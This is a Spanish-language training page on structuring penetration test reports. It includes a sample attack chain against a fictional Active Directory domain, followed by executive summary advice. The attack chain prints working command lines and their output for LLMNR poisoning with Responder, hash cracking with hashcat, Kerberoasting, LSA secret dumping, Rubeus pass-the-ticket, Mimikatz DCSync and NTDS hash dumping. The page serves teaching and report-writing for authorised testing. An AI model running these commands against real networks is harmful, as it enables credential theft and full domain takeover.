
# Componentes de un informe

Como se mencionó anteriormente, el informe es el principal resultado que un cliente paga al contratar a su empresa para realizar una prueba de penetración. Este informe nos brinda la oportunidad de mostrar nuestro trabajo durante la evaluación y brindar al cliente el máximo valor posible. Idealmente, el informe debe estar libre de datos e información superfluos que lo saturan o distraen de los problemas que intentamos transmitir en la visión general de su postura de seguridad. Todo el contenido del informe debe tener una razón de ser, y no queremos abrumar al lector (por ejemplo, ¡no incluya más de 50 páginas de resultados de consola!). En esta sección, abordaremos los elementos clave de un informe y cómo podemos estructurarlo mejor para mostrar nuestro trabajo y ayudar a nuestros clientes a priorizar la remediación.

***

## <mark style="color:purple;">Priorizando nuestros esfuerzos</mark>

Durante una evaluación, especialmente las de gran envergadura, nos enfrentaremos a mucho ruido que debemos filtrar para enfocar mejor nuestros esfuerzos y priorizar los hallazgos. Como pentesters, estamos obligados a divulgar todo lo que encontramos, pero cuando recibimos una gran cantidad de información mediante escaneos y enumeraciones, es fácil perderse o centrarse en lo incorrecto, perder tiempo y, potencialmente, pasar por alto problemas de alto impacto. Por eso es fundamental comprender el resultado que generan nuestras herramientas, contar con pasos repetibles (como scripts u otras herramientas) para filtrar todos estos datos, procesarlos y eliminar falsos positivos o problemas de información que podrían distraernos del objetivo de la evaluación. La experiencia y un proceso repetible son clave para que podamos filtrar todos nuestros datos y centrar nuestros esfuerzos en hallazgos de alto impacto, como fallas de ejecución remota de código (RCE) u otras que puedan dar lugar a la divulgación de datos sensibles. Vale la pena (y es nuestro deber) informar los hallazgos informativos, pero en lugar de gastar la mayor parte de nuestro tiempo validando estos problemas menores y no explotables, es posible que desee considerar consolidar algunos de ellos en categorías que muestren al cliente que usted sabía que los problemas existían, pero no pudo explotarlos de ninguna manera significativa (por ejemplo, 35 variaciones diferentes de problemas con SSL/TLS, un montón de vulnerabilidades DoS en una versión EOL de PHP, etc.).

Al comenzar con las pruebas de penetración, puede ser difícil saber qué priorizar, y podemos caer en la trampa de explotar una falla inexistente o conseguir que funcione un exploit PoC defectuoso. El tiempo y la experiencia son fundamentales, pero también debemos apoyarnos en el apoyo de los miembros senior del equipo y los mentores. Algo en lo que podrías perder medio día podría ser algo que ellos han visto muchas veces y podrían decirte rápidamente si es un falso positivo o si vale la pena investigarlo. Aunque no puedan darte una respuesta clara y concisa, al menos pueden orientarte y ahorrarte varias horas. Rodéate de personas con las que te sientas cómodo pidiendo ayuda y que no te hagan sentir como un idiota si no sabes todas las respuestas.

***

## <mark style="color:purple;">Escribiendo una cadena de ataque</mark>

La cadena de ataque es nuestra oportunidad para mostrar la ingeniosa cadena de explotación que utilizamos para establecernos, movernos lateralmente y comprometer el dominio. Puede ser un mecanismo útil para ayudar al lector a conectar los puntos cuando se utilizan múltiples hallazgos en conjunto y comprender mejor por qué se les asigna la clasificación de gravedad. Por ejemplo, un hallazgo `medium-risk` en particular por sí solo puede ser peligroso, pero, combinado con uno o dos problemas adicionales, podría elevarlo a `high-risk`. Esta sección es nuestra oportunidad para demostrarlo.&#x20;

Un ejemplo común es el uso de `Responder` para interceptar el tráfico [`NBT-NS/LLMNR`](/ethical-hacking-cheatsheet/active-directory/active-directory/sniffing-desde-el-foothold/llmnr-nbt-ns-poisoning-desde-windows.md) y retransmitirlo a hosts donde no existe firma SMB. Puede ser realmente interesante si se incorporan algunos hallazgos que de otro modo podrían parecer insignificantes, como usar una divulgación de información para guiarlo a través de una LFI para leer un archivo de configuración interesante, iniciar sesión en una aplicación externa y aprovechar la funcionalidad para obtener ejecución remota de código y establecerse dentro de la red interna.

Hay varias maneras de presentar esto, y tu estilo puede variar, pero veamos un ejemplo. Comenzaremos con un resumen de la cadena de ataque y luego repasaremos cada paso, junto con la salida de comandos de apoyo y capturas de pantalla para mostrar la cadena de ataque con la mayor claridad posible. Una ventaja es que podemos reutilizar esto como evidencia para nuestros hallazgos individuales, evitando tener que formatear los datos dos veces y copiarlos y pegarlos en el hallazgo relevante.

Comencemos. Supongamos que nos contrataron para realizar una prueba de penetración interna contra la empresa, `Inlanefreight`ya sea con una máquina virtual dentro de la infraestructura del cliente o en su oficina, con nuestro portátil conectado a un puerto Ethernet. Para nuestros fines, esta evaluación simulada se realizó con un `non-evasive`enfoque específico `grey box`, lo que significa que el cliente no intentó interferir activamente con las pruebas y solo proporcionó rangos de red dentro del alcance. Logramos comprometer el dominio interno `INLANEFREIGHT.LOCAL`durante nuestra evaluación.

Nota: También se puede encontrar una copia de esta cadena de ataque en el documento de informe de muestra adjunto.

***

## <mark style="color:purple;">Cadena de ataque de muestra</mark>

### Prueba de penetración interna de INLANEFREIGHT.LOCAL

Durante la prueba de penetración interna realizada contra Inlanefreight, el pentester se afianzó en la red interna, se desplazó lateralmente y, finalmente, comprometió el dominio de Active Directory `INLANEFREIGHT.LOCAL`. El siguiente tutorial ilustra los pasos para pasar de ser un usuario anónimo no autenticado en la red interna a tener acceso de administrador de dominio.&#x20;

El objetivo de esta cadena de ataque es demostrar a Inlanefreight el impacto de cada vulnerabilidad descrita en este informe y cómo se complementan para demostrar el riesgo general para el entorno del cliente y ayudar a priorizar las medidas de remediación (es decir, parchear dos vulnerabilidades rápidamente podría interrumpir la cadena de ataque mientras la empresa trabaja para remediar todos los problemas reportados). Si bien otros hallazgos de este informe podrían aprovecharse para obtener un nivel de acceso similar, esta cadena de ataque muestra la ruta inicial de menor resistencia que siguió el evaluador para comprometer el dominio.

1. El pentester utilizó la herramienta [Responder](https://github.com/lgandx/Responder) para obtener un hash de contraseña NTLMv2 para un usuario de dominio, `bsmith`.
2. Este hash de contraseña fue descifrado exitosamente sin conexión usando la herramienta [Hashcat](https://github.com/hashcat/hashcat) para revelar la contraseña en claro del usuario, lo que le otorgó un punto de acceso al dominio `INLANEFREIGHT.LOCAL`, pero sin más privilegios que un usuario de dominio estándar.
3. El pentester ejecutó la herramienta [BloodHound.py , una versión en Python de la popular herramienta de recopilación ](https://github.com/fox-it/BloodHound.py)[SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) , para enumerar el dominio y crear representaciones visuales de las rutas de ataque. Tras la revisión, el pentester descubrió que existían varios usuarios privilegiados en el dominio configurado con Service Principal Names (SPN), lo que permite realizar un ataque de Kerberoasting y recuperar tickets Kerberos TGS para las cuentas, que pueden descifrarse sin conexión con `Hashcat` si se establece una contraseña débil. A partir de aquí, el pentester utilizó la herramienta [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) para ejecutar un ataque de Kerberoasting dirigido contra la cuenta `mssqlsvc`, tras descubrir que esta tenía derechos de administrador local en el host `SQL01.INLANEFREIGHT.LOCAL`, lo cual representaba un objetivo interesante en el dominio.
4. El pentester logró descifrar con éxito la contraseña de esta cuenta sin conexión y reveló el valor en texto en plano.
5. El pentester se autenticó en el host `SQL01.INLANEFREIGHT.LOCAL` y recuperó una contraseña de texto sin cifrar del registro del host descifrando los secretos LSA de una cuenta (`srvadmin`), que estaba configurada para el inicio de sesión automático.
6. Esta cuenta `srvadmin` tenía derechos de administrador local sobre todos los servidores (excepto los controladores de dominio), por lo que el pentester inició sesión en el host `MS01.INLANEFREIGHT.LOCAL` y recuperó un ticket TGT de Kerberos para un usuario conectado `pramirez`. Este usuario formaba parte del grupo `Tier I Server Admins` que le otorgaba derechos `DCSync` sobre el objeto de dominio. Este ataque puede utilizarse para recuperar el hash de la contraseña NTLM de cualquier usuario del dominio, lo que resulta en la vulneración y persistencia del dominio mediante un Golden Ticket.
7. El pentester utilizó la herramienta [Rubeus](https://github.com/GhostPack/Rubeus) para extraer el ticket TGT de Kerberos para el usuario `pramirez` y realizar un ataque Pass-the-Ticket para autenticarse como este usuario.
8. Finalmente, el pentester realizó un ataque `DCSync` después de autenticarse exitosamente con esta cuenta de usuario a través de la herramienta [Mimikatz](https://github.com/gentilkiwi/mimikatz) , lo que terminó en un compromiso total del dominio.

#### **Los pasos de reproducción detallados para esta cadena de ataque son los siguientes:**

Al conectarse a la red, el pentester inició la herramienta Responder y pudo capturar un hash de contraseña para el usuario `bsmith` falsificando el tráfico NBT-NS/LLMNR en el segmento de red local.

#### **Responder**

```shell-session
afsh4ck@kali$  sudo responder -I eth0 -wrfv

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

 <SNIP>

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.195.168]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TWWXTGD94CV]
    Responder Domain Name      [3BKZ.LOCAL]
    Responder DCE-RPC Port     [47032]

[+] Listening for events...

<SNIP>

[SMB] NTLMv2-SSP Client   : 192.168.195.205
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\bsmith
[SMB] NTLMv2-SSP Hash     : bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:010100000000000000B588D9F766D801191BB2236A5FAAA50000000002000800330042004B005A0001001E00570049004E002D005400570057005800540047004400390034004300560004003400570049004E002D00540057005700580054004700440039003400430056002E00330042004B005A002E004CXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX2E004C004F00430041004C000700080000B588D9F766D801060004000200000008003000300000000000000001000000002000002CAE5BF3BB1FD2F846A280AEF43A8809C15207BFCB4DF5A580BA1B6FCAF6BBCE0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100390035002E00310036003800000000000000000000000000

<SNIP>
```

El pentester logró "descifrar" este hash de contraseña sin conexión usando la herramienta Hashcat y recuperar el valor de la contraseña en texto sin formato, otorgando así un punto de apoyo para enumerar el dominio de Active Directory.

#### **Hashcat**

```shell-session
afsh4ck@kali$ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:010100000000000000b588d9f766d801191bb2236a5faaa50000000002000800330042004b005a0001001e00570049004e002d00540057005700580054004700440039003400430056XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX004700440039003400430056002e00330042004b005a002e004c004f00430041004c0003001400330042004b005a002e004c004f00430041004c0005001400330042004b005a002e004c004f00430041004c000700080000b588d9f766d801060004000200000008003000300000000000000001000000002000002cae5bf3bb1fd2f846a280aef43a8809c15207bfcb4df5a580ba1b6fcaf6bbce0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100390035002e00310036003800000000000000000000000000:<REDACTED>
```

El pentester procedió a enumerar las cuentas de usuario configuradas con Service Principal Names (SPN) que podrían ser objeto de un ataque de Keberoasting. Esta técnica de movimiento lateral/escalada de privilegios se dirige a los SPN (identificadores únicos que Kerberos utiliza para asignar una instancia de servicio a una cuenta de servicio). Cualquier usuario del dominio puede solicitar un ticket de Kerberos para cualquier cuenta de servicio del dominio, y este se cifra con el hash  NTLM de la cuenta de servicio, que puede descifrarse sin conexión para revelar el valor de la contraseña en texto plano de la cuenta.

#### **Obtener SPN de usuario**

```shell-session
afsh4ck@kali$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                         Name       MemberOf  PasswordLastSet             LastLogon  Delegation 
-------------------------------------------  ---------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433      mssqlsvc             2022-05-13 16:52:07.280623  <never>               
MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod              2022-05-13 16:54:52.889815  <never>               
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev               2022-05-13 16:54:57.905315  <never>               
MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                2022-05-13 16:55:03.421004  <never>               
backupjob/veam001.inlanefreight.local        backupjob            2022-05-13 18:38:17.740269  <never>               
vmware/vc.inlanefreight.local                vmwaresvc            2022-05-13 18:39:10.691799  <never> 
```

El pentester ejecutó la versión en Python de la popular herramienta de enumeración BloodHound de Active Directory para recopilar información como usuarios, grupos, equipos, listas de control de acceso (ACL), pertenencia a grupos, propiedades de usuarios y equipos, sesiones de usuario, acceso de administrador local, etc. Estos datos pueden importarse a una herramienta GUI para crear representaciones visuales de las relaciones dentro del dominio y trazar rutas de ataque que permitan un posible desplazamiento lateral o una escalada de privilegios dentro del dominio.

#### **Bloodhound**

```shell-session
afsh4ck@kali$ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 503 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 652 users

<SNIP>
```

El pentester utilizó esta herramienta para verificar los privilegios de cada cuenta SPN enumerada en los pasos anteriores y observó que solo la cuenta `mssqlsvc` tenía privilegios adicionales a los de un usuario de dominio estándar. Esta cuenta tenía acceso de administrador local al host `SQL01`. Los servidores SQL suelen ser objetivos de alto valor en un dominio, ya que contienen credenciales privilegiadas, datos confidenciales o incluso pueden tener un usuario con más privilegios conectado.

<figure><img src="/files/zwgiuzPgVswFtMWPnR7h" alt=""><figcaption></figcaption></figure>

Luego, el pentester realizó un ataque Kerberoasting dirigido para recuperar el ticket TGS de Kerberos para la cuenta de servicio `mssqlsvc`.

#### **GetUserSPNs**

```shell-session
afsh4ck@kali$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                     Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------------  --------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433  mssqlsvc            2022-05-13 16:52:07.280623  <never>               


$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a3988485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c44ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf68286ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a897185716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e <SNIP>
```

El pentester logró "descifrar" esta contraseña sin conexión con Hashcat para revelar su valor en texto claro.

#### **Hashcat**

```shell-session
afsh4ck@kali$ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c43cf68f965432014279555d1984740$5a<SNIP>:<REDACTED>
```

Esta contraseña se podría utilizar para acceder al host `SQL01` de forma remota y recuperar un conjunto de credenciales de texto sin formato del registro para la cuenta `srvadmin`.

#### **CrackMapExec**

```shell-session
afsh4ck@kali$ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa

SMB         192.168.195.220 445    SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         192.168.195.220 445    SQL01            [+] INLANEFREIGHT.LOCAL\mssqlsvc:<REDACTED> 
SMB         192.168.195.220 445    SQL01            [+] Dumping LSA secrets
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7bd0f186CCCCC450c5e8cb53228cc0
SMB         192.168.195.220 445    SQL01            INLANEFREIGHT.LOCAL/srvadmin:$DCC2$10240#srvadmin#ef393703f3fabCCCCCa547caffff5f

<SNIP>

SMB         192.168.195.220 445    SQL01            INLANEFREIGHT\srvadmin:<REDACTED>

<SNIP>

SMB         192.168.195.220 445    SQL01            [+] Dumped 10 LSA secrets to /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.secrets and /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.cached
```

Usando estas credenciales, el pentester inició sesión en el  host `MS01` a través de Remote Desktop Protocol (RDP) y notó que otro usuario, `pramirez`, también estaba conectado en ese momento.

#### **Usuarios conectados**

```cmd-session
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 pramirez              rdp-tcp#1           2  Active          3  5/14/2022 8:21 AM
>srvadmin              rdp-tcp#2           3  Active          .  5/14/2022 8:24 AM
```

El pentester revisó la herramienta BloodHound y observó que este usuario podía realizar el ataque `DCSync`, una técnica para robar la base de datos de contraseñas de Active Directory mediante un protocolo utilizado por los controladores de dominio para replicar los datos del dominio. Este ataque puede utilizarse para recuperar hashes de contraseñas NTLM de cualquier usuario del dominio.

<figure><img src="/files/b6fOnjmfXiFyVGvfk5t0" alt=""><figcaption></figcaption></figure>

Después de conectarse, el pentester utilizó la herramienta Rubeus para ver todos los tickets de Kerberos disponibles actualmente en el sistema y notó que había tickets para el usuario `pramirez`.

#### **Rubeus**

```powershell
PS C:\htb> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x256aef

 ------------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                       | Service                                           | EndTime              |
 ------------------------------------------------------------------------------------------------------------------------
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:24:19 PM |
 | 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:24:19 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | ProtectedStorage/DC01.INLANEFREIGHT.LOCAL         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01.INLANEFREIGHT.LOCAL                     | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | cifs/DC01                                         | 5/14/2022 6:21:35 PM |
 | 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 5/14/2022 6:21:35 PM |
 | 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 5/14/2022 6:21:35 PM |
```

Luego, el pentester utilizó esta herramienta para recuperar el ticket TGT de Kerberos para este usuario, que luego puede usarse para realizar un ataque de "pass-the-ticket" y usar el ticket TGT robado para acceder a los recursos del dominio.

```powershell
PS C:\htb> .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x1a8b19
[*] Current LUID    : 0x256aef

  UserName                 : pramirez
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x1a8b19
  UserSID                  : S-1-5-21-1666128402-2659679066-1433032234-1108
  AuthenticationPackage    : Negotiate
  LogonType                : RemoteInteractive
  LogonTime                : 5/14/2022 8:21:35 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
  UserPrincipalName        : pramirez@INLANEFREIGHT.LOCAL


    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
    ServiceRealm             :  INLANEFREIGHT.LOCAL
    UserName                 :  pramirez
    UserRealm                :  INLANEFREIGHT.LOCAL
    StartTime                :  5/15/2022 3:51:35 AM
    EndTime                  :  5/15/2022 1:51:35 PM
    RenewTill                :  5/21/2022 8:21:35 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k=
    Base64EncodedTicket   :

      doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg<SNIP>

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

El pentester realizó el ataque Pass the Ticket y se autenticó exitosamente como el usuario `pramirez`.

```powershell
PS C:\htb> .\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>
```

Esto se confirmó utilizando el comando `klist` para ver los tickets Kerberos almacenados en caché en la sesión actual.

#### **Tickets Kerberos en caché**

```
PS C:\htb> klist

Current LogonId is 0:0x256d1d

Cached Tickets: (1)

#0>     Client: pramirez @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 5/15/2022 3:51:35 (local)
        End Time:   5/15/2022 13:51:35 (local)
        Renew Time: 5/21/2022 8:21:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Luego, el pentester utilizó este acceso para realizar un ataque DCSync y recuperar el hash NTLM para la cuenta de administrador incorporada, lo que condujo al acceso de nivel de administrador empresarial en el dominio (SYSTEM).

#### **Mimikatz**

```powershell-session
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
[DC] ms-DS-ReplicationEpoch is: 1

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/12/2022 9:32:55 PM
Object Security ID   : S-1-5-21-1666128402-2659679066-1433032234-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```

El pentester confirmó este acceso autenticándose en un controlador de dominio en el dominio `INLANEFREIGHT.LOCAL`.

#### **CrackMapExec**

```shell-session
afsh4ck@kali$ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2

SMB         192.168.195.204 445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.195.204 445    DC01             [+] INLANEFREIGHT.LOCAL\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2 
```

Con este acceso, fue posible recuperar los hashes de contraseñas NTLM de todos los usuarios del dominio. El pentester realizó posteriormente un descifrado sin conexión de estos hashes con la herramienta Hashcat. En los apéndices de este informe se puede encontrar un análisis de contraseñas del dominio con diversas métricas.

#### **Volcado de NTDS con SecretsDump**

```shell-session
afsh4ck@kali$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cxxxxxxxxxx7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4180f1f4xxxxxxxxxx0e8523771a8c:::
mssqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:55a6c7xxxxxxxxxxxx2b07e1:::
srvadmin:1107:aad3b435b51404eeaad3b435b51404ee:9f9154fxxxxxxxxxxxxx0930c0:::
pramirez:1108:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9xxxxxxxxxxxxxed5c58:::

<SNIP>
```

***

## <mark style="color:purple;">Cómo escribir un resumen ejecutivo sólido</mark>

El `Executive Summary` es una de las partes más importantes del informe. Como se mencionó anteriormente, nuestros clientes pagan por el informe, que tiene varios propósitos además de mostrar las debilidades y los pasos de reproducción que pueden ser utilizados por los equipos técnicos que trabajan en la remediación. Es probable que el informe sea revisado en parte por otras partes interesadas internas, como Auditoría Interna, la gerencia de TI y Seguridad de TI, la alta dirección e incluso la Junta Directiva. El informe puede utilizarse para validar la financiación del año anterior para seguridad de la información o para solicitar financiación adicional para el año siguiente. Por esta razón, debemos asegurarnos de que el contenido del informe sea fácilmente comprensible para personas sin conocimientos técnicos.

#### **Conceptos clave**

El público objetivo del `Executive Summary` suele ser la persona responsable de asignar el presupuesto para solucionar los problemas detectados. Para bien o para mal, algunos de nuestros clientes probablemente llevan años intentando conseguir financiación para solucionar los problemas presentados en el informe y tienen la firme intención de utilizarlo como argumento para finalmente conseguir resultados. Esta es nuestra mejor oportunidad para ayudarlos. Si perdemos a nuestro público objetivo en algunos casos y existen limitaciones presupuestarias, el resto del informe puede resultar rápidamente inservible. Algunos aspectos clave que debemos asumir (que pueden ser ciertos o no) para maximizar la eficacia del `Executive Summary` son:

* Debería ser obvio, pero esto debería estar escrito para alguien sin conocimientos técnicos. El barómetro típico para esto es: «Si tus padres no entienden el propósito, entonces tienes que intentarlo de nuevo» (suponiendo que tus padres no sean CISO, administradores de sistemas ni nada por el estilo).
* El lector no hace esto todos los días. No sabe qué hace Rubeus, qué significa Password Spraying ni cómo es posible que las entradas otorguen diferentes tipos (o probablemente ni siquiera qué es una entrada, aparte de un papel para entrar a un concierto o a un partido de béisbol).
* Esta podría ser la primera vez que se sometan a una prueba de penetración.
* Al igual que el resto del mundo en la era de la gratificación instantánea, su capacidad de atención es limitada. Cuando la perdemos, es extremadamente improbable que la recuperemos.
* Del mismo modo, a nadie le gusta leer algo que le obligue a buscar en Google el significado de las cosas. A eso se le llama distracción.

Hablemos de una lista de "qué hacer y qué no hacer" a la hora de escribir un documento  `Executive Summary` efectivo.

#### **Que Hacer**

* `Al hablar de métricas, se lo más específico posible.` Palabras como "varios", "múltiples" y "pocos" son ambiguas y podrían significar 6 o 500. Los ejecutivos no van a revisar el informe para encontrar esta información, así que si va a hablar de ello, dígales lo que tiene; de ​​lo contrario, perderá su atención. La razón más común por la que las personas no se comprometen con una cifra específica es dejarla abierta por si el consultor omitió alguna. Puede hacer pequeños cambios en el lenguaje para tener esto en cuenta, como "aunque puede haber casos adicionales de X, en el tiempo asignado a la evaluación, observamos 25 casos de X".
* `Es un resumen. Mantenlo así.` Si escribiste más de una página y media o dos, probablemente te excediste en la verbosidad. Examina los temas que trataste y determina si se pueden agrupar en categorías más generales que podrían corresponder a políticas o procedimientos específicos.
